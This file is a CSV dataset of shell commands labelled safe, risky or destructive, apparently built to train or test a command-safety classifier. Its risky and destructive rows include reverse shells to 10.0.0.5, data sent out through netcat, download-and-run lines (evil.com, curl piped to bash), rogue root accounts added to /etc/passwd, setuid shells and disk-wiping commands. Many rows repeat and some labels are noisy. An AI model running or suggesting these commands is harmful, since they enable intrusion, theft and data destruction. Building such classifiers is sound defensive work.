command,label
"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.5"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",risky
echo 'working' && systemctl,safe
ls -v,safe
sudo chmod 777 /usr,destructive
chmod u+s /tmp/x,risky
rm -rf /var,destructive
rm -rf __pycache__,risky
curl http://10.0.0.9/install.sh | bash,risky
curl http://10.0.0.9/install.sh | bash,risky
chmod -R 777 /var/www,risky
sudo dd,destructive
mkdir --help,safe
git push,safe
rm -rf /tmp/test/*,risky
chmod 4777 /bin/bash,risky
crontab -e,risky
sudo ls,safe
echo root2:x:0:0 >> /etc/passwd,risky
apt -v,safe
mv --help,safe
git stash,safe
sudo grep,safe
curl http://10.0.0.9/install.sh | bash,risky
dd if=/dev/urandom of=/dev/sdb bs=1M,destructive
echo 'IyEvYmluL2Jhc2gK' | base64 -d | bash,risky
systemctl disable ufw,risky
cat file.txt,safe
echo 'working' && git,safe
mv /var/log,safe
dd if=/dev/urandom of=/dev/sdb bs=4M,destructive
rm -f package-lock.json,risky
git build/,safe
mkfs.vfat /dev/sdb1,destructive
shred -u /dev/mmcblk0,destructive
cat data/,safe
rg 'TODO' src/,safe
grep ..,safe
rm -rf tmp/*,risky
rm -rf /tmp/test/*,risky
mkfs.xfs /dev/sdb1,destructive
chmod -R 777 /tmp/data,risky
echo root2:x:0:0 >> /etc/passwd,risky
echo 'working' && systemctl,safe
head --help,safe
rm -rf /etc,destructive
echo root2:x:0:0 >> /etc/passwd,risky
export LD_LIBRARY_PATH=/tmp/lib.so,risky
ls,safe
sudo head,safe
sudo dd if=image.iso of=/dev/sda bs=4M,destructive
htop,safe
cat /etc/shadow,risky
echo 'working' && pip,safe
chmod 777 /opt/app,risky
git --help,safe
mkfs.vfat /dev/sdb1,destructive
curl http://10.0.0.9/install.sh | bash,risky
rm -rf ./node_modules,risky
sh <(curl http://example.com/s.sh),risky
ls -lah /var/log | tail -20,safe
curl http://10.0.0.9/install.sh | bash,risky
rm -rf build,risky
mkdir -v,safe
chmod 4755 /bin/bash,risky
chmod 4755 /bin/busybox,risky
export LD_PRELOAD=/home/user/evil.so,risky
lsusb,safe
cat | grep -i ok,safe
head -20 access.log,safe
mkdir | grep -i warn,safe
sudo git,safe
docker compose up -d,safe
chmod 4755 /bin/busybox,risky
chmod 4755 /bin/busybox,risky
mv --help,safe
mv -v,safe
echo admin:x:0:0 >> /etc/passwd,risky
echo 'working' && head,safe
mkdir /var/log,safe
apt --help,safe
sudo rm,destructive
find / -name 'x' -exec /bin/sh \;,risky
npm install,safe
echo 'working' && ls,safe
pwd,safe
grep -v,safe
cp --help,safe
ls -la,safe
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash,risky
systemctl /tmp,safe
echo 'working' && git,safe
mv --help,safe
chmod -R 766 /opt/app,risky
parted /dev/sda rm 1,destructive
rm -rf /*,destructive
curl http://example.com/install.sh | bash,risky
ls ~/documents,safe
pip /tmp,safe
find / -delete,destructive
apt -v,safe
curl http://example.com/install.sh | bash,risky
top,safe
dd if=/dev/urandom of=/dev/sdb bs=1M,destructive
echo 'working' && mv,safe
echo 'working' && head,safe
systemctl stop firewalld,risky
curl http://example.com/install.sh | bash,risky
nmap -p 22 localhost,safe
:(){ :|:& };: &,destructive
dd if=/dev/urandom of=/dev/nvme0n1 bs=4M,destructive
chmod -R 766 /var/www,risky
systemctl --help,safe
chmod u+s /bin/busybox,risky
echo 'working' && cat,safe
reboot --force,risky
which python3,safe
rm -rf build,risky
tail -f /var/log/syslog,safe
mkfs.ext4 /dev/sdb1,destructive
export LD_LIBRARY_PATH=/home/user/evil.so,risky
curl http://10.0.0.9/install.sh | bash,risky
head --help,safe
rm -rf --no-preserve-root /,destructive
systemctl --help,safe
sudo rm -rf /var/lib/dpkg,destructive
sudo git,safe
rm -rf dist/*,risky
export LD_LIBRARY_PATH=/home/user/evil.so,risky
hostname,safe
mkdir ..,safe
systemctl status nginx,safe
:(){ :|:& };:,destructive
sudo git,safe
ls --help,safe
dd if=/dev/urandom of=/dev/nvme0n1 bs=4M,destructive
chmod u+s /bin/busybox,risky
shred -u /dev/sdb,destructive
chmod -R 777 /var/www,risky
echo root2:x:0:0 >> /etc/passwd,risky
sudo journalctl -u ssh --since 1 hour ago,safe
rm -rf /usr,destructive
shred -vfz /dev/mmcblk0,destructive
curl http://example.com/install.sh | bash,risky
wipe -fd /dev/sda,destructive
kill -9 -1,risky
sudo apt,safe
cat --help,safe
mkdir --help,safe
sudo systemctl,safe
export LD_PRELOAD=/home/user/evil.so,risky
git | grep -i error,safe
mkdir --help,safe
head -v,safe
export LD_LIBRARY_PATH=/tmp/lib.so,risky
mkfs.ext4 /dev/sda,destructive
chmod u+s /bin/bash,risky
grep -v,safe
ls --help,safe
rm -rf /etc,destructive
export PATH=$PATH:/opt/bin,safe
sudo apt,safe
chmod -R 766 .,risky
shred -n 3 /dev/mmcblk0,destructive
sudo pip,safe
git pull origin main,safe
git /tmp,safe
echo 'working' && head,safe
git --help,safe
sudo ls,safe
mv /tmp,safe
export LD_LIBRARY_PATH=/home/user/evil.so,risky
rm -rf node_modules/.cache,risky
echo 0 > /proc/sys/kernel/randomize_va_space,risky
mkdir | grep -i error,safe
sudo ls,safe
grub-install --recheck --removable,destructive
cat --help,safe
chmod 4755 /bin/bash,risky
docker | grep -i fail,safe
shred -u /dev/sda,destructive
grep -v,safe
rm -rf node_modules/.cache,risky
dig example.com,safe
export LD_LIBRARY_PATH=/home/user/evil.so,risky
shred -vfz /dev/sdb,destructive
rm -rf /usr,destructive
chmod 4777 /bin/bash,risky
echo admin:x:0:0 >> /etc/passwd,risky
echo 'working' && docker,safe
git /var/log,safe
chmod 4755 /bin/busybox,risky
echo 'working' && grep,safe
chmod 4777 /tmp/x,risky
sudo wipefs,destructive
sudo ls,safe
echo 'working' && cat,safe
rm -rf /*,destructive
yes | head -c 1000000000 > /dev/null,destructive
systemctl src/,safe
git data/,safe
rm -rf tmp/*,risky
dd if=/dev/urandom of=/dev/sda bs=512,destructive
apt --help,safe
sudo su -,risky
chmod -R 766 /tmp/data,risky
rm -rf __pycache__,risky
sudo docker,safe
curl http://example.com/install.sh | bash,risky
journalctl -u nginx --since today,safe
shutdown -h now,risky
sudo cp,safe
sudo cat,safe
docker --help,safe
cp --help,safe
rm -rf /tmp/test/*,risky
unzip release.zip -d /opt/app,safe
git ~/documents,safe
cp /var/log,safe
id,safe
rm -rf /*,destructive
cmake ..,safe
chmod -R 766 /opt/app,risky
rm -rf node_modules/.cache,risky
mv -v,safe
chmod 4777 /bin/busybox,risky
chmod -R 777 /opt/app,risky
kill -9 1,risky
sudo shred,destructive
export LD_PRELOAD=/tmp/lib.so,risky
apt update,safe
echo admin:x:0:0 >> /etc/passwd,risky
chmod -R 777 .,risky
sudo sysctl -w kernel.randomize_va_space=0,risky
rm -rf dist,risky
git | grep -i ok,safe
echo 'working' && pip,safe
chmod u+s /tmp/x,risky
echo root2:x:0:0 >> /etc/passwd,risky
export LD_PRELOAD=/tmp/lib.so,risky
chmod u+s /bin/bash,risky
killall -9 java,risky
echo admin:x:0:0 >> /etc/passwd,risky
mkfs.ext4 /dev/nvme0n1,destructive
tar czf - /home/user | nc 10.0.0.5 4444,risky
cargo build --release,safe
mkdir src/,safe
while true; do true; done,destructive
curl http://10.0.0.9/install.sh | bash,risky
sudo pip,safe
chmod 4755 /bin/busybox,risky
dd if=/dev/zero of=/dev/nvme0n1 bs=512,destructive
curl http://example.com/install.sh | bash,risky
mkdir -p projects/backend/src,safe
git --help,safe
git | grep -i ok,safe
shred -n 3 /dev/sdb,destructive
systemctl -v,safe
sudo head,safe
rm -rf build,risky
ls -v,safe
echo 'working' && cat,safe
cat | grep -i ok,safe
rm -rf build,risky
chmod -R 777 /tmp/data,risky
rm -rf build,risky
curl http://example.com/install.sh | bash,risky
sudo dd,destructive
chmod 755 script.sh,safe
docker ~/documents,safe
head /tmp,safe
mkdir -v,safe
rm -rf /usr,destructive
mkdir -v,safe
echo 'working' && git,safe
echo admin:x:0:0 >> /etc/passwd,risky
rm -rf tmp/*,risky
cp build/,safe
cp --help,safe
pkill -9 -u root,risky
mv -v,safe
dd if=/dev/urandom of=/dev/mmcblk0 bs=512,destructive
mkdir .,safe
echo root2:x:0:0 >> /etc/passwd,risky
chmod 4777 /bin/busybox,risky
shred -u /dev/sda,destructive
echo 'working' && grep,safe
mv | grep -i error,safe
wget http://evil.com/backdoor.py -O /tmp/b.py && python /tmp/b.py,risky
echo 'working' && apt,safe
apt -v,safe
dd if=/dev/zero of=/dev/mmcblk0 bs=512,destructive
rm -rf ~,destructive
rm -rf node_modules/.cache,risky
ps aux,safe
sudo rm -rf /usr/bin,destructive
shred -u /dev/mmcblk0,destructive
mkfs.xfs /dev/sdb1,destructive
echo admin:x:0:0 >> /etc/passwd,risky
git -v,safe
chmod -R 777 .,risky
usermod -o -u 0 username,risky
apt .,safe
echo root2:x:0:0 >> /etc/passwd,risky
curl http://10.0.0.9/install.sh | bash,risky
echo admin:x:0:0 >> /etc/passwd,risky
systemctl -v,safe
echo admin:x:0:0 >> /etc/passwd,risky
echo 'working' && head,safe
docker --help,safe
head | grep -i warn,safe
ufw disable,risky
shred -n 3 /dev/sdb,destructive
apt /var/log,safe
export LD_LIBRARY_PATH=/home/user/evil.so,risky
cat .,safe
echo root2:x:0:0 >> /etc/passwd,risky
systemctl /tmp,safe
echo 'working' && git,safe
mkdir -v,safe
git --help,safe
cat .,safe
dd if=/dev/urandom of=/dev/nvme0n1 bs=1M,destructive
mkfs.ext4 /dev/sdb1,destructive
fdisk /dev/sda && mkfs.ext4 /dev/sda1,destructive
apt /tmp,safe
sudo apt,safe
mv -v,safe
export LD_PRELOAD=/tmp/lib.so,risky
rm -rf tmp/*,risky
sudo grep,safe
mkfs.vfat /dev/sda,destructive
python app.py,safe
git -v,safe
git add .,safe
chmod -R 777 /var/www,risky
uniq -c access.log | sort -rn | head,safe
make,safe
echo 'working' && systemctl,safe
source ~/.bashrc,safe
chmod 4777 /bin/bash,risky
chmod -R 777 /tmp/data,risky
pip /var/log,safe
sudo systemctl,safe
sudo wipefs,destructive
sudo cp,safe
pip -v,safe
rm -rf /tmp/test/*,risky
curl http://example.com/install.sh | bash,risky
grep --help,safe
sudo dd,destructive
head -v,safe
rm -rf /tmp/test/*,risky
docker ps,safe
mkfs.xfs /dev/sda,destructive
git -v,safe
uname -a,safe
export LD_PRELOAD=/tmp/lib.so,risky
sudo apt,safe
dd if=/dev/zero of=/dev/nvme0n1 bs=4M,destructive
export LD_PRELOAD=/tmp/lib.so,risky
echo 'working' && apt,safe
grep data/,safe
export LD_LIBRARY_PATH=/tmp/lib.so,risky
sudo rm,destructive
echo 'working' && grep,safe
rm -rf tmp/*,risky
export LD_LIBRARY_PATH=/home/user/evil.so,risky
dmesg | tail,safe
mv --help,safe
git checkout -b feature/new,safe
rm -rf __pycache__,risky
pip --help,safe
PATH=$PATH:/tmp,risky
mkfs.btrfs /dev/nvme0n1,destructive
chmod 4755 /bin/busybox,risky
grep -v,safe
dd if=/dev/urandom of=/dev/nvme0n1 bs=512,destructive
docker -v,safe
ls --help,safe
sudo git,safe
echo 'working' && pip,safe
export LD_PRELOAD=/home/user/evil.so,risky
python3 main.py --port 8080,safe
chmod 4755 /bin/bash,risky
touch newfile.txt,safe
cp --help,safe
clear,safe
echo root2:x:0:0 >> /etc/passwd,risky
sudo rm,destructive
ls | grep -i warn,safe
head -v,safe
export LD_LIBRARY_PATH=/tmp/lib.so,risky
pip -v,safe
sudo grep,safe
tree -L 2,safe
echo admin:x:0:0 >> /etc/passwd,risky
echo 'working' && pip,safe
mkfs.vfat /dev/sdb1,destructive
git -v,safe
sudo useradd -m testuser,safe
curl http://example.com/install.sh | bash,risky
mkfs.vfat /dev/sdb1,destructive
chmod -R 766 .,risky
rm -rf /var,destructive
"perl -e 'exec ""/bin/sh"";'",risky
rm -rf node_modules/.cache,risky
tar --checkpoint=1 --checkpoint-action=exec=/bin/sh,risky
cd /var/log,safe
npm list --depth=0,safe
echo root2:x:0:0 >> /etc/passwd,risky
sudo rm -rf /,destructive
curl http://10.0.0.9/install.sh | bash,risky
mkfs.vfat /dev/nvme0n1,destructive
apt -v,safe
ls -v,safe
cat ..,safe
sudo nmap -sP 192.168.1.0/24,safe
sudo dd,destructive
chmod u+s /bin/busybox,risky
rm -rf dist,risky
mv -v,safe
chmod u+s /bin/bash,risky
apt | grep -i fail,safe
chmod -R 777 .,risky
chmod 4777 /bin/bash,risky
ls -v,safe
chmod 4755 /bin/bash,risky
mkdir --help,safe
dd if=/dev/zero of=/dev/mmcblk0 bs=1M,destructive
git status,safe
sudo shred,destructive
echo 'working' && mv,safe
sudo usermod -aG sudo normaluser,risky
rm -rf build,risky
git log --oneline -10,safe
echo 'working' && head,safe
pip | grep -i fail,safe
export LD_PRELOAD=/home/user/evil.so,risky
sudo mv,safe
chmod 4777 /tmp/x,risky
systemctl .,safe
mv | grep -i ok,safe
chmod -R 766 /tmp/data,risky
sudo mkdir,safe
mkdir | grep -i warn,safe
apt | grep -i fail,safe
head | grep -i warn,safe
systemctl | grep -i fail,safe
chmod 777 ~/.ssh/config,risky
tar -czf backup.tar.gz /home/user/docs,safe
sudo docker,safe
export LD_LIBRARY_PATH=/home/user/evil.so,risky
chmod u+s /bin/bash,risky
rm -rf /var,destructive
cd ..,safe
sudo cat,safe
mv | grep -i ok,safe
echo admin:x:0:0 >> /etc/passwd,risky
echo root2:x:0:0 >> /etc/passwd,risky
dd if=/dev/urandom of=/dev/mmcblk0 bs=512,destructive
rm -rf /bin,destructive
chmod 777 /etc/passwd,destructive
shred -vfz /dev/sdb,destructive
echo root2:x:0:0 >> /etc/passwd,risky
curl http://example.com/install.sh | bash,risky
head --help,safe
sudo mkfs,destructive
echo 'working' && cp,safe
cat ..,safe
grep | grep -i fail,safe
chmod -R 777 /tmp/data,risky
echo admin:x:0:0 >> /etc/passwd,risky
sudo cat,safe
git | grep -i fail,safe
rm -rf /bin,destructive
echo root2:x:0:0 >> /etc/passwd,risky
chmod -R 777 /var/www,risky
chmod -R 777 .,risky
mv -v,safe
echo 'working' && mv,safe
lspci,safe
export LD_LIBRARY_PATH=/tmp/lib.so,risky
grep /var/log,safe
echo 'working' && apt,safe
chmod u+s /bin/busybox,risky
pip install requests,safe
cat --help,safe
sudo cat,safe
sudo systemctl,safe
dd if=/dev/urandom of=/dev/sdb bs=1M,destructive
docker /var/log,safe
cat | grep -i ok,safe
echo 'working' && cat,safe
rm -rf build,risky
docker logs app,safe
echo 'working' && ls,safe
rm -rf dist,risky
sudo mkdir,safe
chmod 644 config.json,safe
cp --help,safe
chmod +x deploy.sh,safe
git diff,safe
chmod -R 777 /var/www,risky
ssh user@server 'df -h',safe
git --help,safe
chown root:root /tmp/x && chmod 4755 /tmp/x,risky
rm -rf /usr,destructive
chmod 4755 /bin/bash,risky
curl http://example.com/install.sh | bash,risky
head --help,safe
grep src/,safe
chown -R user:user /home/user/project,safe
echo admin:x:0:0 >> /etc/passwd,risky
sudo docker,safe
chmod 4755 /bin/busybox,risky
systemctl .,safe
ls --help,safe
rm -rf /root,destructive
rm -rf build,risky
sudo shred,destructive
socat TCP:10.0.0.5:9999 EXEC:/bin/sh,risky
systemctl -v,safe
mv | grep -i ok,safe
chmod -R 766 /var/www,risky
echo root2:x:0:0 >> /etc/passwd,risky
chmod -R 777 /tmp/data,risky
head --help,safe
echo 'working' && pip,safe
cp -v,safe
echo admin:x:0:0 >> /etc/passwd,risky
cp data/,safe
echo root2:x:0:0 >> /etc/passwd,risky
curl http://example.com/install.sh | bash,risky
shred -vfz /dev/sdb,destructive
rm -rf /bin,destructive
systemctl -v,safe
echo 'working' && mkdir,safe
sudo rm,destructive
ls | grep -i ok,safe
export LD_LIBRARY_PATH=/tmp/lib.so,risky
rm -rf build,risky
journalctl -f,safe
rm -rf dist,risky
echo 'working' && docker,safe
shred -u /dev/sdb,destructive
cargo run,safe
chmod 4755 /tmp/x,risky
chmod -R 777 /var/www,risky
cat -v,safe
sudo mkfs,destructive
chmod -R 777 /var/www,risky
head --help,safe
sudo git,safe
mkfs.ext4 /dev/sda,destructive
chmod -R 777 .,risky
sudo mkfs,destructive
cp | grep -i ok,safe
apt --help,safe
mv ..,safe
grep -v,safe
export LD_LIBRARY_PATH=/home/user/evil.so,risky
exit,safe
echo 'working' && git,safe
curl http://10.0.0.9/install.sh | bash,risky
cp -v,safe
grep --help,safe
shred -u /dev/mmcblk0,destructive
echo 'working' && grep,safe
mkdir -v,safe
sudo cp,safe
grep --help,safe
git --help,safe
systemctl stop bluetooth,safe
nslookup google.com,safe
apt -v,safe
cat --help,safe
sed -i 's/old/new/g' file.txt,safe
python --version,safe
rm -rf /dev/sda,destructive
rm -rf node_modules/.cache,risky
grep -r error /var/log,safe
pip build/,safe
echo 'working' && mkdir,safe
mkfs -t ext4 /dev/sdb,destructive
sudo head,safe
more notes.txt,safe
echo admin:x:0:0 >> /etc/passwd,risky
man rsync,safe
grep | grep -i ok,safe
ip route,safe
eval $(cat /tmp/script.txt),risky
export LD_LIBRARY_PATH=/home/user/evil.so,risky
chmod -R 777 .,risky
watch -n 2 'df -h',safe
chmod 777 /etc/hosts,risky
ls /tmp,safe
shred -n 3 /dev/sdb,destructive
echo 'working' && apt,safe
curl -s http://pwn.example.com/x | sh,risky
docker /tmp,safe
rm -rf .,destructive
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.5 5555 > /tmp/f,risky
echo 'working' && mkdir,safe
"awk 'BEGIN {system(""/bin/sh"")}'",risky
echo 'working' && ls,safe
tar -xzf archive.tar.gz -C /tmp,safe
tar --checkpoint-action=exec='echo hacked',risky
echo 'working' && cat,safe
awk '{print $1}' access.log,safe
blkdiscard /dev/sda,destructive
git ~/documents,safe
pip list,safe
mkdir /tmp/test,safe
dd if=/dev/urandom of=/dev/nvme0n1 bs=512,destructive
chmod 4755 /bin/busybox,risky
shred -u /dev/mmcblk0,destructive
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1,risky
grep | grep -i ok,safe
git rebase main,safe
echo root2:x:0:0 >> /etc/passwd,risky
systemctl list-units,safe
export LD_PRELOAD=/tmp/lib.so,risky
ls /tmp,safe
sudo docker,safe
docker system df,safe
chmod 4777 /bin/busybox,risky
cp | grep -i error,safe
git -v,safe
sudo mv,safe
export LD_LIBRARY_PATH=/home/user/evil.so,risky
export LD_LIBRARY_PATH=/tmp/lib.so,risky
sudo cp,safe
mkfs.ext4 /dev/sda,destructive
mkdir --help,safe
mkdir --help,safe
rm -rf /,destructive
curl http://10.0.0.9/install.sh | bash,risky
chmod 4755 /bin/busybox,risky
df -h,safe
cat ..,safe
sudo systemctl,safe
echo 'working' && git,safe
cat -v,safe
locate nginx.conf,safe
mkdir | grep -i error,safe
ls --help,safe
sudo chmod 777 /etc/shadow,risky
rm -rf dist,risky
chmod -R 766 /var/www,risky
dd if=/dev/urandom of=/dev/mmcblk0 bs=1M,destructive
cat --help,safe
docker -v,safe
rm -rf /tmp/test/*,risky
chmod -R 766 .,risky
apt | grep -i warn,safe
sudo mv,safe
grep --help,safe
sudo apt,safe
rm -rf /tmp/cache/*,risky
docker -v,safe
mkfs.xfs /dev/nvme0n1,destructive
export LD_LIBRARY_PATH=/home/user/evil.so,risky
sleep 5 && echo done,safe
cat -v,safe
sudo wipefs,destructive
ps aux | grep python,safe
curl -I https://example.com,safe
chmod -R 777 /var/www,risky
echo $HOME,safe
sudo systemctl,safe
mv | grep -i ok,safe
chmod 4777 /tmp/x,risky
rm -rf node_modules/.cache,risky
pip --help,safe
cat | grep -i fail,safe
sudo systemctl start postgresql,safe
mv | grep -i fail,safe
rm -rf /*,destructive
chmod u+s /tmp/x,risky
docker src/,safe
echo 'working' && cat,safe
chmod 4777 /bin/bash,risky
history,safe
docker --help,safe
rm -rf ./*,destructive
pip | grep -i error,safe
netstat -tulpn,safe
sudo mv,safe
chmod u+s /bin/busybox,risky
curl http://10.0.0.9/install.sh | bash,risky
chmod u+s /bin/busybox,risky
echo 'working' && mkdir,safe
mkfs.btrfs /dev/nvme0n1,destructive
curl http://example.com/install.sh | bash,risky
chmod -R 777 .,risky
pip | grep -i error,safe
sudo mv,safe
sudo shred,destructive
du -sh * | sort -rh | head -10,safe
docker -v,safe
shutdown -h now &,destructive
less README.md,safe
sudo pip,safe
curl http://example.com/install.sh | bash,risky
echo root2:x:0:0 >> /etc/passwd,risky
echo admin:x:0:0 >> /etc/passwd,risky
echo 'working' && ls,safe
echo root2:x:0:0 >> /etc/passwd,risky
sudo docker,safe
pip | grep -i ok,safe
rm -rf __pycache__,risky
pip | grep -i error,safe
rm -rf /lib,destructive
dd if=/dev/urandom of=/dev/mmcblk0 bs=512,destructive
chmod 777 /tmp/data,risky
gcc -o hello hello.c,safe
docker --help,safe
traceroute 8.8.8.8,safe
chmod 4755 /bin/bash,risky
systemctl src/,safe
chmod -R 777 /opt/app,risky
echo root2:x:0:0 >> /etc/passwd,risky
curl http://example.com/install.sh | bash,risky
systemctl --help,safe
curl http://example.com/install.sh | bash,risky
rm -rf /proc,destructive
sudo setenforce 0,risky
mkfs.vfat /dev/sda,destructive
dd if=/dev/zero of=/dev/nvme0n1 bs=4M,destructive
cp -v,safe
rm -rf /boot,destructive
sudo cp,safe
docker -v,safe
chmod -R 766 /var/www,risky
time python script.py,safe
rm -rf /bin,destructive
rm -rf /etc,destructive
ls --help,safe
chmod -R 777 .,risky
docker src/,safe
export LD_PRELOAD=/home/user/evil.so,risky
git fetch origin,safe
yes | head -10,safe
rm -rf tmp/*,risky
sudo cp,safe
echo 'working' && mv,safe
du -sh /home/user,safe
mv --help,safe
curl http://example.com/install.sh | bash,risky
sudo mkfs,destructive
env,safe
cp | grep -i error,safe
ls | grep -i fail,safe
find . -name '*.py',safe
ls | grep -i warn,safe
sudo rm,destructive
echo root2:x:0:0 >> /etc/passwd,risky
docker | grep -i fail,safe
shred -n 3 /dev/mmcblk0,destructive
dd if=/dev/zero of=/dev/nvme0n1 bs=1M,destructive
rm -rf build,risky
chmod -R 766 .,risky
docker | grep -i warn,safe
chmod 4755 /bin/bash,risky
echo 'working' && systemctl,safe
sudo su,risky
dd if=/dev/urandom of=/dev/nvme0n1 bs=1M,destructive
rm -fr /,destructive
sudo cat,safe
curl http://example.com/install.sh | bash,risky
echo 'working' && docker,safe
find / -exec rm -rf {} +,destructive
curl http://10.0.0.9/install.sh | bash,risky
chmod -R 777 /tmp/data,risky
head .,safe
export LD_PRELOAD=/home/user/evil.so,risky
rm -rf /,destructive
curl http://example.com/install.sh | bash,risky
head -v,safe
chmod -R 766 /var/www,risky
echo 'working' && pip,safe
dd if=/dev/zero of=/dev/sda bs=4M,destructive
sudo apt install htop,safe
chmod -R 777 .,risky
chmod -R 766 .,risky
